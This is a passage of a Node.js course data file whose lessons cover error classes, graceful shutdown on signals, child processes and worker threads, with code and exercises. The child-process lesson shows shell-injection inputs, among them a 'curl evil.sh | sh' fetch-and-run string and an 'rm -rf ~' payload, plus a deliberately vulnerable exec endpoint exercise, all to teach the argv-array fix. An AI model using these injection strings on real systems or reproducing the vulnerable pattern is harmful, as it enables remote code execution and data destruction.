**Serializing.** \`JSON.stringify(err)\` returns \`{}\` because Error's built-in properties are non-enumerable — you must define \`toJSON()\` (name, message, code, details) yourself. Across services, keep \`cause\`/stack server-side; expose \`code\` + a safe \`message\`. Never leak SQL, filesystem paths or hostnames in a 500 body. And prefer \`err.code\` checks over \`instanceof\` at boundaries: duplicated module copies (two dependency trees) or realm boundaries can break \`instanceof\`.
    `,
    howItWorks: `
\`instanceof\` walks the prototype chain: \`err instanceof AppError\` is true only when AppError.prototype is reachable from err. V8 captures the stack at construction time via \`Error.captureStackTrace\`, skipping frames you name as helpers. That is why subclasses must fix their prototype before anyone checks them, and why a stack captured in a base constructor still points at the right line if you pass the constructor as the skip frame.

Serialization is where most teams lose information: structured logging (pino, winston) handles Error objects natively and picks up \`code\`/\`cause\`, but \`JSON.stringify\` does not. Adding \`toJSON()\` or logging \`{ err }\` in pino keeps the chain intact across process boundaries.
    `,
    codeExamples: [
      {
        title: "A small, correct error hierarchy",
        language: "js",
        code: `export class AppError extends Error {
  constructor(message, { code = "APP_ERROR", status = 500, cause, details } = {}) {
    super(message, cause !== undefined ? { cause } : undefined);
    this.name = new.target.name; // subclass name, not "Error"
    this.code = code; // stable, machine-readable
    this.status = status; // HTTP mapping lives on the error itself
    this.details = details;
    this.expose = status < 500; // is it safe to show the message to a client?
    Error.captureStackTrace(this, new.target); // stack starts at the throw site
  }

  toJSON() {
    return { name: this.name, code: this.code, message: this.message, details: this.details };
  }
}

export class NotFoundError extends AppError {
  constructor(resource, id) {
    super(resource + " " + id + " not found", { code: "NOT_FOUND", status: 404 });
  }
}

const err = new NotFoundError("user", "42");
console.log(err instanceof AppError, err.name, err.code, err.status); // true NotFoundError NOT_FOUND 404
console.log(JSON.stringify(err)); // {"name":"NotFoundError",...} — plain Error would be {}
console.log(err.stack.split("\\n")[0]); // NotFoundError: user 42 not found`,
        description:
          "code for machines, message for humans, status for the HTTP layer, expose deciding what may leave the process, and toJSON so JSON.stringify stops returning an empty object.",
      },
      {
        title: "Chaining causes and mapping once to HTTP",
        language: "js",
        code: `import { AppError, NotFoundError } from "./errors.js";

// Producer: preserve the original failure as cause, add context as the message
async function loadUser(db, id) {
  const row = await db.query("SELECT id FROM users WHERE id = $1", [id]).catch((err) => {
    throw new AppError("database unavailable while loading user", {
      code: "DB_DOWN",
      status: 503,
      cause: err, // full driver error + stack stays in logs
    });
  });
  if (!row) throw new NotFoundError("user", id);
  return row;
}

// Consumer: exactly ONE place converts errors to responses
function toResponse(err) {
  if (err instanceof AppError && err.expose) {
    return { status: err.status, body: { error: err.code, message: err.message, details: err.details } };
  }
  console.error("unhandled:", err, err?.cause); // log everything, including the cause chain
  return { status: 500, body: { error: "INTERNAL_ERROR", message: "Something went wrong." } };
}`,
        description:
          "The boundary pattern: domain code throws typed errors with causes; one adapter decides status codes and what is safe to expose. Never let driver messages reach a client.",
      },
    ],
    commonMistakes: [
      "Relying on JSON.stringify(err) across a queue or HTTP boundary — you get {} unless you implement toJSON().",
      "Throwing bare strings ('something failed') — no stack, no code, breaks instanceof and structured logging.",
      "Exposing internal messages (SQL, paths, vendor errors) on 500 responses — information disclosure.",
      "Using instanceof as the only check across microservices or duplicated dependency copies; verify err.code too.",
    ],
    bestPractices: [
      "Give every error a stable code and document the code list in your API reference.",
      "Chain originals with { cause } and keep full stacks in logs; expose only code plus a safe message.",
      "Classify operational vs programmer errors explicitly; only the first kind should ever be caught and continued.",
      "Centralise the error → status mapping in a single function used by every route.",
    ],
    realWorldUseCases: [
      "API clients branching on error.code === 'EMAIL_TAKEN' instead of matching English messages.",
      "A job queue that retries errors flagged operational (DB_DOWN) and dead-letters programmer errors after one attempt.",
    ],
    resources: [
      docs(
        "Node.js API — Error",
        "https://nodejs.org/api/errors.html",
        "Node's own error classes, error codes and cause-chaining conventions.",
        "en",
        "reference",
      ),
      docs(
        "MDN — Error: cause",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause",
        "How to chain the original failure instead of concatenating messages.",
        "en",
        "6 min",
      ),
      docs(
        "MDN — throw statement",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/throw",
        "What may be thrown and how it unwinds the stack.",
        "en",
        "5 min",
      ),
      ytSearch(
        "custom error classes javascript typescript best practices",
        "Subclassing Error correctly, codes and operational error handling.",
        "en",
        "10–20 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-error-class",
        title: "Design an error taxonomy",
        prompt:
          "For an order API, list eight failures (validation, auth, conflict, rate limit, downstream timeout, DB down, bug in pricing, unknown). For each: name, code, status, operational or programmer, whether the message is client-safe, and whether it should be retried. Then implement the classes with one shared base.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "Anything with status >= 500 that is not your bug (timeout, DB down) is operational AND retryable.",
          "A pricing bug is a programmer error — returning a wrong total is worse than a 500.",
        ],
      },
      {
        id: "ex-p2m1-serialize",
        title: "Survive the wire",
        prompt:
          "Prove that JSON.stringify(new Error('x')) is {}. Then send your custom error through JSON.stringify, JSON.parse on the other side, and show what is lost. Finally implement toJSON() (plus a deserialize helper that rebuilds the right subclass from { name, code }) and show round-trip equality of code/status/details.",
        difficulty: "intermediate",
        estimatedMinutes: 30,
        hints: ["Only own enumerable properties survive stringify — Error's message/stack are not enumerable.", "Keep a registry map from name → class in the deserializer."],
      },
    ],
    projectIds: ["p2-auth-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-process-signals",
    slug: "process-signals-and-shutdown",
    title: "Process Signals and Graceful Shutdown",
    description:
      "SIGINT, SIGTERM and SIGHUP, Windows differences, idempotent shutdown handlers, server.close(), draining sockets and exit codes.",
    order: 10,
    estimatedMinutes: 20,
    tags: ["signals", "shutdown", "ops"],
    prerequisites: ["p1m4-node-architecture", "p1m4-env-vars-node"],
    relatedTopics: ["p2m1-error-propagation", "p2m1-child-processes", "p2m1-eventemitter-advanced"],
    learningObjectives: [
      "Explain what SIGINT, SIGTERM and SIGHUP do and what Node changes when you listen for them",
      "Describe the Windows signal differences that matter in development",
      "Implement an idempotent graceful shutdown: stop accepting, drain, close dependencies, exit",
      "Explain why server.close() alone can hang and how to bound the drain",
    ],
    simpleExplanation:
      "Signals are one-word messages from the operating system: Ctrl+C sends SIGINT, Kubernetes sends SIGTERM before it kills a container. By default they terminate your process immediately, cutting off in-flight requests. Adding a handler takes over that default — Node will no longer exit on its own, so your handler must stop accepting connections, let current requests finish, close the database and call process.exit with the right code.",
    detailedContent: `
**The signals you will actually use**

| Signal | Sent by | Notes |
| --- | --- | --- |
| \`SIGINT\` | Ctrl+C (all platforms) | default: terminate with 128+2 on POSIX; not generated in raw-mode terminals |
| \`SIGTERM\` | orchestrators, \`kill\`, Docker/K8s stop | **not supported on Windows** (can be listened for, never delivered) |
| \`SIGHUP\` | terminal closed; reload hint on some daemons | on Windows it is generated when the console window closes, but Windows will unconditionally kill Node ~10s later |
| \`SIGBREAK\` | Ctrl+Break | Windows only |
| \`SIGUSR1\` | reserved | starts the Node debugger — do not repurpose it |
| \`SIGKILL\`/\`SIGSTOP\` | force | cannot be caught, on any platform |

Two documented subtleties: installing a listener **removes** the default termination behaviour for SIGINT/SIGTERM, so your process will keep running until you exit; and signal events are delivered **asynchronously** — if the event loop is empty, Node may exit before your handler runs.

**The shutdown sequence**

1. Guard with a flag — signals often arrive twice (SIGTERM, then SIGKILL from the orchestrator).
2. \`server.close()\` — stop accepting **new** connections; existing ones keep working.
3. Optionally mark readiness as false (\`/readyz\` → 503) so load balancers take you out of rotation.
4. Drain: wait for in-flight requests. Beware: \`server.close()\` waits for **keep-alive** sockets too, so it may never fire — call \`server.closeIdleConnections()\` (Node 18.2+) or track sockets and destroy them after a grace period.
5. Close dependencies in reverse order of creation (queue producer → database → logger flush).
6. \`process.exitCode = 0\` then exit — or force-exit non-zero if the deadline passes.

Bound everything with one timeout that force-exits, because after the platform's grace period you get SIGKILL anyway — better to lose gracefully on your terms.
    `,
    howItWorks: `
When the first listener for a signal is registered, Node asks libuv to install a signal watcher (\`uv_signal_start\`). The OS interrupt does not run JavaScript directly: libuv wakes the loop, and Node invokes your listener as an ordinary loop callback with the signal name — which is why your handler must schedule its own work and why an empty loop can exit first. Removing the last listener restores the default OS behaviour.

On Windows there are no POSIX signals: Ctrl+C arrives as SIGINT through the console handler, and \`process.kill(pid, 'SIGTERM')\` is emulated by forcibly terminating the target, so it cannot be caught. That is why cross-platform apps must handle SIGINT locally and rely on SIGTERM semantics only inside Linux containers.
    `,
    codeExamples: [
      {
        title: "Idempotent graceful shutdown",
        language: "js",
        code: `import http from "node:http";

const server = http.createServer((req, res) => res.end("ok"));
server.listen(3000);

let shuttingDown = false;

async function shutdown(signal) {
  if (shuttingDown) return; // second signal is a no-op
  shuttingDown = true;
  console.log(signal, "received — draining");

  const deadline = setTimeout(() => {
    console.error("drain deadline exceeded, forcing exit");
    process.exit(1);
  }, 10_000);
  deadline.unref();

  // 1) stop accepting new connections
  server.close(() => console.log("http server closed"));
  server.closeIdleConnections(); // keep-alive sockets must not block close()

  // 2) close dependencies in reverse order
  await queue.close();
  await db.end();

  console.log("clean shutdown");
  clearTimeout(deadline);
  process.exit(0);
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT")); // same path in dev (Ctrl+C) and prod`,
        description:
          "One handler for both signals, a flag so duplicates are harmless, idle-connection closing so keep-alive clients cannot hang the drain, and a deadline that guarantees an exit code before the orchestrator's SIGKILL.",
      },
      {
        title: "Take yourself out of rotation while draining",
        language: "js",
        code: `import http from "node:http";

let ready = false; // false from boot, true once dependencies are up
const server = http.createServer((req, res) => {
  if (req.url === "/readyz") {
    res.writeHead(ready ? 200 : 503, { "content-type": "application/json" });
    return res.end(JSON.stringify({ ready }));
  }
  res.end("ok");
});

// In shutdown: flip first, then close — LBs stop sending traffic before you drain
process.on("SIGTERM", async () => {
  ready = false;
  await new Promise((r) => setTimeout(r, 5000)); // propagation window
  server.close(() => process.exit(0));
});`,
        description:
          "A readiness endpoint is how load balancers discover that you are going away. Flip it to 503, wait for the routing change, then close — otherwise you cut requests that were sent to you a millisecond ago.",
      },
    ],
    commonMistakes: [
      "Registering no handler at all — SIGTERM hard-kills the process, in-flight responses are truncated and half-written jobs stay half-written.",
      "Calling process.exit(0) as soon as the signal arrives, before responses are flushed or logs are written.",
      "Forgetting that server.close() waits for idle keep-alive connections, so shutdown hangs until the deadline.",
      "Assuming SIGTERM/SIGHUP behave like Linux on Windows — SIGTERM is never delivered, SIGHUP on console close only buys you ~10 seconds.",
    ],
    bestPractices: [
      "Make shutdown idempotent and bounded: one flag, one deadline, one place that exits.",
      "Close in reverse dependency order and always flush logs before exiting.",
      "Handle SIGINT with the same code path as SIGTERM so local runs exercise real shutdown logic.",
      "Log each shutdown phase with timestamps — a hanging deploy becomes a 30-second investigation instead of an outage.",
    ],
    realWorldUseCases: [
      "Zero-downtime deploys: the old pod gets SIGTERM, finishes requests, exits 0, and only then is replaced.",
      "CLI tools that must delete temp files or roll back a partial operation when the user presses Ctrl+C.",
    ],
    resources: [
      docs(
        "Node.js API — Process signal events",
        "https://nodejs.org/api/process.html#processsignal-events",
        "The authoritative notes on SIGINT/SIGTERM/SIGHUP, Windows behaviour and asynchronous delivery.",
        "en",
        "12 min",
      ),
      docs(
        "Node.js API — server.close() and closeIdleConnections()",
        "https://nodejs.org/api/net.html#serverclosecallback",
        "What stopping the listener does — and does not — close.",
        "en",
        "8 min",
      ),
      ytSearch(
        "node.js graceful shutdown sigterm draining connections",
        "End-to-end shutdown walkthroughs with Express and Docker.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-signal",
        title: "Observe a graceful vs ungraceful stop",
        prompt:
          "Start an HTTP endpoint that sleeps 5 seconds before responding. Send three concurrent requests, then SIGTERM the process. Run it twice: once with no handler, once with the full shutdown sequence. Record for each: how many responses the client received, the process exit code, and the server log lines. Explain the difference.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "PowerShell: Stop-Process -Id <pid> gives SIGTERM-like termination on Windows — test the real handler on Linux/macOS or WSL.",
          "Without closeIdleConnections(), keep-alive clients may block server.close().",
        ],
      },
      {
        id: "ex-p2m1-shutdown",
        title: "Implement the sequence",
        prompt:
          "Add graceful shutdown to any existing project: signal handlers (SIGINT + SIGTERM), a draining flag, a readiness endpoint, dependency closing in reverse order and a force-exit deadline. Prove it with curl in one terminal while sending the signal from another, and paste the ordered log output.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "Guard with a boolean so a double signal cannot run cleanup twice.",
          "Set process.exitCode even when you let the loop empty naturally.",
        ],
        solution: `let draining = false;

async function shutdown(signal) {
  if (draining) return;
  draining = true;
  console.log(signal, "→ draining");

  const force = setTimeout(() => process.exit(1), 10_000).unref?.();
  ready = false;
  server.close();
  server.closeIdleConnections();
  await db.end();

  clearTimeout(force);
  console.log("clean exit");
  process.exit(0);
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-task-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-child-processes",
    slug: "child-processes",
    title: "Child Processes",
    description:
      "exec vs execFile vs spawn vs fork, stdio pipes, exit codes, and how to run commands built from user input without getting shell-injected.",
    order: 11,
    estimatedMinutes: 20,
    tags: ["child-process", "shell", "security"],
    prerequisites: ["p1m4-node-architecture", "p1m4-fs-module"],
    relatedTopics: ["p2m1-worker-threads", "p2m1-process-signals", "p2m1-streams-backpressure"],
    learningObjectives: [
      "Choose between exec, execFile, spawn and fork for a given task",
      "Handle 'error', 'exit' and 'close' correctly, including non-zero exit codes",
      "Explain why command strings built from user input are a shell injection vulnerability",
      "Wire IPC with fork and reap children during shutdown",
    ],
    simpleExplanation:
      "A child process is a separate OS process started from your Node.js process. exec() runs a command through the system shell and returns its whole output at once — convenient, but if you interpolate untrusted input into that string, you have handed the user a terminal. spawn() starts a program directly with an argument array and streams its output; fork() starts another Node.js process with a message channel.",
    detailedContent: `
| API | Shell? | Output | Returns | Use for |
| --- | --- | --- | --- | --- |
| \`exec\` | **yes** (\`/bin/sh -c\`) | buffered (default max 1 MB) | callback \`{stdout, stderr}\` | quick trusted one-liners |
| \`execFile\` | no | buffered | callback | same, but safer/faster for a known binary |
| \`spawn\` | no (unless \`shell: true\`) | streamed via pipes | \`ChildProcess\` | anything with real output or input |
| \`fork\` | no | JSON IPC channel | \`ChildProcess\` | another Node.js script with \`process.send\` |

Facts that catch everyone once:

- **Non-zero exit is not an error event.** spawn only emits \`'error'\` for failures to start (ENOENT, EACCES). A command that runs and exits 1 emits no error — you must inspect the code argument yourself. \`exec\` wraps that into \`err.code\`.
- **'exit' vs 'close'.** 'exit' fires when the process ends; 'close' fires when **all stdio streams** are closed. Await 'close' if you want the complete output — otherwise your last stdout chunk may still be in flight.
- \`exec\`'s output is capped by \`maxBuffer\` (1 MB default); exceeding it kills the child with \`ERR_CHILD_PROCESS_STDIO_MAXBUFFER\`. Stream with spawn when you do not know the size.
- **fork** costs a whole Node.js runtime per child (tens of MB) but gives you structured messages; use \`serialization: 'advanced'\` for non-JSON values.

**Security.** \`exec("convert " + userFile + " out.png")\` lets \`userFile = "x.png; curl evil.sh | sh"\` run arbitrary commands. Fixes, in order of preference: (1) spawn/execFile with an **array of arguments** — user input never becomes shell syntax; (2) validate against an allowlist of characters/paths; (3) never enable \`shell: true\` unless unavoidable, and then never interpolate. Argv arrays stop injection — they do not sandbox the program you run, so still drop privileges and bound runtime and output.
    `,
    howItWorks: `
Node asks libuv to \`fork+exec\` the target with an argv array and sets up OS pipes between parent and child. Those pipes are registered on the parent's event loop, so \`child.stdout.on('data')\` is ordinary I/O — backpressure works exactly like any stream. For \`fork\`, libuv creates an extra pipe carrying newline-delimited (or advanced-serialized) messages, surfaced as \`process.on('message')\` in the child and \`child.on('message')\` in the parent. Because the child is a separate process, it has its own heap, its own event loop and its own exit code — which is what makes it useful for isolation as well as for running other programs.
    `,
    codeExamples: [
      {
        title: "A spawn wrapper that gets errors and exit codes right",
        language: "js",
        code: `import { spawn } from "node:child_process";

function run(cmd, args, { timeoutMs = 30_000, maxOutput = 1024 * 1024 } = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, { stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
    let out = "";
    let errOut = "";

    const timer = setTimeout(() => {
      child.kill("SIGKILL");
      reject(new Error(cmd + " timed out after " + timeoutMs + "ms"));
    }, timeoutMs);

    child.stdout.on("data", (c) => {
      out += c;
      if (out.length > maxOutput) child.kill("SIGKILL");
    });
    child.stderr.on("data", (c) => (errOut += c));

    child.on("error", (err) => {
      // failed to START (ENOENT, EACCES) — a different failure from a bad exit code
      clearTimeout(timer);
      reject(err);
    });

    child.on("close", (code, signal) => {
      // 'close' = process ended AND all stdio flushed
      clearTimeout(timer);
      if (code === 0) resolve(out);
      else reject(new Error(cmd + " exited with " + (code ?? signal) + ": " + errOut.trim()));
    });
  });
}

const nodeVersion = await run("node", ["--version"]); // no shell, argv array
console.log(nodeVersion.trim());`,
        description:
          "The four failure modes separated: start error, timeout, non-zero exit, and huge output. Awaiting 'close' rather than 'exit' guarantees stdout is complete before you resolve.",
      },
      {
        title: "Injection vs argv — and fork IPC",
        language: "js",
        code: `import { exec, spawn, fork } from "node:child_process";

// DANGEROUS — user input becomes shell syntax
exec("convert " + req.query.file + " out.png"); // file = "a.png; rm -rf ~" → runs rm

// SAFE — no shell: each argument is one argv entry, never re-parsed
const child = spawn("convert", [sanitisedPath, "out.png"], { stdio: "ignore", timeout: 10_000 });

// fork(): a Node.js script with an IPC channel
// worker-task.js
//   process.on("message", (job) => process.send({ id: job.id, rows: heavyWork(job.payload) }));
const worker = fork("./worker-task.js", [], { serialization: "advanced" });
worker.send({ id: 1, payload: rows });
worker.on("message", (result) => console.log("done", result.id));
worker.on("exit", (code) => {
  if (code !== 0) console.error("worker failed with", code);
});`,
        description:
          "One line shows a real command-injection vulnerability; the next shows the fix (argument array, no shell). fork() is for delegating Node.js work to another process with messages — heavier than a worker thread, but with full crash isolation.",
      },
    ],
    commonMistakes: [
      "Interpolating request data into an exec string — the single most common RCE pattern in Node.js codebases.",
      "Treating 'exit' as 'output is complete' — the final stdout chunk can arrive after 'exit' but before 'close'.",
      "Assuming spawn emits 'error' when the command exits non-zero — that is a normal exit you must check.",
      "Leaving children running on shutdown — orphaned processes keep ports and file locks alive after the parent exits.",
    ],
    bestPractices: [
      "Prefer spawn/execFile with an argument array; treat shell: true as an exception requiring written justification.",
      "Always set a timeout, cap output, and kill children in your SIGTERM handler so nothing is orphaned.",
      "Validate and allowlist every value that reaches argv — argument arrays stop injection, not path traversal.",
      "Run untrusted or heavy work with reduced privileges (containers, drop capabilities); argv safety is not a sandbox.",
    ],
    realWorldUseCases: [
      "Image and PDF conversion (ImageMagick, pandoc, ffmpeg) from an upload API with size and time limits.",
      "Wrapping legacy CLI tools or git commands in a service while capturing stdout, stderr and exit codes for logs.",
    ],
    resources: [
      docs(
        "Node.js API — Child processes",
        "https://nodejs.org/api/child_process.html",
        "exec/execFile/spawn/fork semantics, stdio options, exit codes and the IPC channel.",
        "en",
        "reference",
      ),
      docs(
        "OWASP — Command injection",
        "https://owasp.org/www-community/attacks/Command_Injection",
        "How injection attacks work and the canonical prevention guidance.",
        "en",
        "10 min",
      ),
      ytSearch(
        "node child process spawn exec fork explained",
        "Comparative walkthroughs including a real injection demo.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-spawn",
        title: "Compare the four APIs",
        prompt:
          "For one command of your choice (git status, node --version, dir/ls): run it with exec, execFile and spawn. Record for each: how you get stdout, what happens on a non-zero exit (try a command that fails), and what happens with a non-existent binary (ENOENT). Write a short table of the differences.",
        difficulty: "intermediate",
        estimatedMinutes: 30,
        hints: [
          "ENOENT surfaces differently: exec/execFile pass it to the callback, spawn emits 'error'.",
          "A failing command gives err.code in exec but code !== 0 in spawn's 'close'.",
        ],
      },
      {
        id: "ex-p2m1-injection",
        title: "Exploit and fix your own endpoint",
        prompt:
          "Build a /read?url= endpoint that (badly) runs `exec('curl -s ' + url)`. Demonstrate command injection locally using a harmless payload such as '; echo INJECTED'. Then rewrite it with spawn('curl', ['-s', url]) and show the same payload is treated as a literal argument. Write two sentences on what argv arrays do and do not protect against.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "Only test against localhost with harmless echo payloads.",
          "Argument arrays prevent shell parsing — they do not validate where the argument points.",
        ],
        solution: `import { spawn } from "node:child_process";
import http from "node:http";

http
  .createServer((req, res) => {
    const url = new URL(req.url, "http://localhost").searchParams.get("url") ?? "";
    if (!/^https?:\\/\\/[a-z0-9.\\-]+/i.test(url)) {
      res.writeHead(400);
      return res.end("bad url");
    }
    const child = spawn("curl", ["-s", url], { timeout: 5000 });
    let body = "";
    child.stdout.on("data", (c) => (body += c));
    child.on("close", (code) => {
      res.writeHead(code === 0 ? 200 : 502);
      res.end(body.slice(0, 4096));
    });
  })
  .listen(3000);`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-inventory-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-worker-threads",
    slug: "worker-threads",
    title: "Worker Threads",
    description:
      "When CPU-bound work must leave the event loop, Worker and MessagePort, SharedArrayBuffer at a glance, and worker_threads vs child_process.",
    order: 12,
    estimatedMinutes: 22,
    tags: ["worker-threads", "concurrency", "performance"],
    prerequisites: ["p2m1-event-loop-order", "p2m1-microtasks-macrotasks", "p1m4-node-architecture"],
    relatedTopics: ["p2m1-child-processes", "p2m1-memory-management", "p2m1-event-loop-order"],
    learningObjectives: [
      "Identify CPU-bound work that blocks the loop and must move to another thread",
      "Run code in a Worker using workerData, postMessage and the lifecycle events",
      "Describe what SharedArrayBuffer and Atomics provide and why they need discipline",
      "Choose worker_threads or child_process based on cost, isolation and messaging needs",
    ],
    simpleExplanation:
      "Node.js runs your JavaScript on one thread. Anything that waits (disk, network, database) can be async; anything that burns CPU (parsing a huge JSON, hashing, PDF generation) freezes every other request while it runs. Worker threads let you run that computation on a second thread inside the same process and send results back with postMessage.",
    detailedContent: `
**Diagnosis first.** If the work waits, use async I/O — a worker only adds copies and startup cost. If the work computes (compression, image resize, CSV crunching, crypto KDFs), it blocks the loop: no timers fire, no requests are answered, and event-loop delay climbs. Move exactly that kind of work off the main thread.

**The Worker API**

- \`new Worker(file, { workerData, execArgv, resourceLimits })\` boots a full Node.js runtime (its own V8 isolate and event loop) on a new thread.
- Communication: \`worker.postMessage(value)\` ↔ \`worker.on('message')\` (and \`parentPort\` inside the worker). Values are **structured-cloned**: plain objects, arrays, Map/Set, ArrayBuffer — no functions, no class instances, and big payloads are copied (costly).
- Lifecycle: \`'message'\`, \`'error'\` (uncaught throw inside the worker), \`'exit'\` (code), \`'messageerror'\` (unserializable message). \`terminate()\` stops a runaway worker; \`unref()\` lets the main loop exit without waiting.
- Workers keep the process alive — always terminate or finish them in your shutdown path.
- \`resourceLimits\` (e.g. \`maxOldGenerationSizeMb\`) bounds a worker that processes untrusted input so one mistake cannot take the whole process heap with it.

**SharedArrayBuffer + Atomics.** One block of memory every thread sees — no copying, ideal for a ring buffer or a shared counter. The catch: concurrent access has no implicit ordering, so you must use \`Atomics.load/store/add/notify/wait\`. Treat it as an advanced optimisation: the copy postMessage performs is usually cheaper than the risk.

**worker_threads vs child_process**

| | worker_threads | child_process |
| --- | --- | --- |
| Cost | lighter (shared process, MBs) | heavier (full OS process) |
| Isolation | same process — a hard crash affects all | crash/OOM contained; kill -9 works |
| Messaging | structured clone, optional shared memory | pipes/IPC, JSON or advanced serialization |

Rule of thumb: same program, parallel CPU → worker; different program, untrusted code, or crash isolation → child process; scaling beyond one machine → separate services.
    `,
    howItWorks: `
Creating a Worker spins up a new V8 isolate (its own heap and GC) plus a libuv loop bound to a pthread inside your process. \`postMessage\` structured-clones the value into a fresh allocation on the receiver's heap and queues a message job on its loop — a 100 MB object costs 100 MB of copying, twice. \`SharedArrayBuffer\` instead maps the same underlying memory into every isolate, which is why Atomics (CPU-level fences plus wait/notify) are mandatory for correctness.

Errors thrown in a worker surface as an \`'error'\` event carrying the Error (stack included); an unhandled rejection inside a worker ends it with a non-zero exit code, which the parent sees on \`'exit'\`.
    `,
    codeExamples: [
      {
        title: "Move a CPU-heavy call off the main loop",
        language: "js",
        code: `// worker.js — runs on its own thread with its own event loop
import { parentPort, workerData } from "node:worker_threads";
import crypto from "node:crypto";

const { text, rounds } = workerData;
const hash = crypto.pbkdf2Sync(text, "salt", rounds, 64, "sha512");
parentPort.postMessage({ hash: hash.toString("hex") });`,
        description:
          "workerData is delivered once at startup (no message round-trip needed); parentPort is how the worker talks back. pbkdf2Sync is CPU-bound — on the main thread it would block every request for the duration.",
      },
      {
        title: "The pool-shaped parent side",
        language: "js",
        code: `import { Worker } from "node:worker_threads";

function hashInWorker(text, rounds) {
  return new Promise((resolve, reject) => {
    const w = new Worker(new URL("./worker.js", import.meta.url), {
      workerData: { text, rounds },
      resourceLimits: { maxOldGenerationSizeMb: 64 },
    });

    w.on("message", (msg) => {
      resolve(msg.hash);
      w.terminate(); // workers keep the loop alive — always release them
    });
    w.on("error", reject); // uncaught throw inside the worker
    w.on("exit", (code) => {
      if (code !== 0) reject(new Error("worker exited with " + code));
    });
  });
}

// Zero-copy for large buffers, and shared memory for hot counters
const shared = new SharedArrayBuffer(4);
const counter = new Int32Array(shared);
Atomics.add(counter, 0, 1);

const big = new ArrayBuffer(1024 * 1024 * 8);
// worker.postMessage(big, [big]); // transfer list: main thread loses access, worker gains it`,
        description:
          "Three lifecycle concerns in one place: settle on message, surface 'error', and reject on a non-zero exit. The footer shows the two ways to avoid copying — transferring an ArrayBuffer (one-way move) and SharedArrayBuffer (shared, needs Atomics).",
      },
    ],
    commonMistakes: [
      "Offloading I/O-bound work to workers — you pay thread startup and message copies for no benefit; use async I/O instead.",
      "Spawning a Worker per request with no bound — threads and heaps multiply until the container OOMs.",
      "Assuming postMessage is cheap: cloning a large object can cost more than the computation you moved.",
      "Forgetting to terminate workers during shutdown — the process never exits because workers keep the loop alive.",
    ],
    bestPractices: [
      "Pool workers at roughly CPU-core size and queue excess jobs instead of creating workers on demand.",
      "Keep worker interfaces message-shaped: pass ids and small payloads, not live database connections or sockets.",
      "Set resourceLimits for workers handling untrusted input, and treat a worker crash as a normal failure mode.",
      "Measure event-loop delay before and after — only move work off-loop when the numbers justify it.",
    ],
    realWorldUseCases: [
      "Image resizing or password hashing in an e-commerce API while checkout traffic stays responsive.",
      "Report/CSV generation in a job board backend that must not stall other API requests.",
    ],
    resources: [
      docs(
        "Node.js API — Worker threads",
        "https://nodejs.org/api/worker_threads.html",
        "Worker, parentPort, workerData, postMessage, transfer lists and resourceLimits.",
        "en",
        "reference",
      ),
      docs(
        "MDN — SharedArrayBuffer",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer",
        "Shared memory between threads and why synchronisation is required.",
        "en",
        "8 min",
      ),
      docs(
        "MDN — Atomics",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Atomics",
        "Atomic load/store/add, wait and notify for cross-thread coordination.",
        "en",
        "10 min",
      ),
      ytSearch(
        "node worker threads vs child processes when to use",
        "Benchmarks and decision guides for moving CPU work off the event loop.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-block-loop",
        title: "Measure the block, then fix it",
        prompt:
          "Write a server whose /cpu route computes something heavy (pbkdf2 with high rounds, or a fib(40)). Add a metric that logs event-loop delay every second. Hit /cpu five times concurrently with curl and record the delay plus the response times of a concurrent /ping. Then move the computation to a Worker and repeat. Report both numbers before and after.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "Measure delay with setInterval + process.hrtime.bigint() deltas.",
          "Use Promise.all with five curls to create real concurrency.",
        ],
      },
      {
        id: "ex-p2m1-worker-pool",
        title: "Bound the concurrency",
        prompt:
          "Wrap your worker call in a tiny pool: max N workers, jobs queue when all are busy, and the pool is drained (terminate) during shutdown. Prove that 50 jobs with N=4 produce at most 4 live workers — log worker.threadId on start and on exit.",
        difficulty: "intermediate",
        estimatedMinutes: 45,
        hints: [
          "Keep an array of busy workers and a FIFO of pending jobs.",
          "Resolve the job promise when 'message' arrives, then start the next queued job.",
        ],
        solution: `import { Worker } from "node:worker_threads";

export function createPool(path, max) {
  const busy = new Set();
  const queue = [];

  function next() {
    if (busy.size >= max || queue.length === 0) return;
    const { job, resolve, reject } = queue.shift();
    const w = new Worker(path, { workerData: job });
    busy.add(w);
    w.on("message", (msg) => resolve(msg));
    w.on("error", reject);
    w.on("exit", () => {
      busy.delete(w);
      next(); // refill as soon as a slot frees up
    });
  }

  return {
    run(job) {
      return new Promise((resolve, reject) => {
        queue.push({ job, resolve, reject });
        next();
      });
    },
    async close() {
      await Promise.all([...busy].map((w) => w.terminate()));
      queue.length = 0;
    },
  };
}`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-ecommerce-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-memory-management",
    slug: "memory-management",
    title: "Memory Management and Leaks",
    description:
      "V8's generational garbage collector, what actually counts as a leak, closures and collections that hold memory, and monitoring rss vs heapUsed.",
    order: 13,
    estimatedMinutes: 20,
    tags: ["memory", "v8", "performance"],
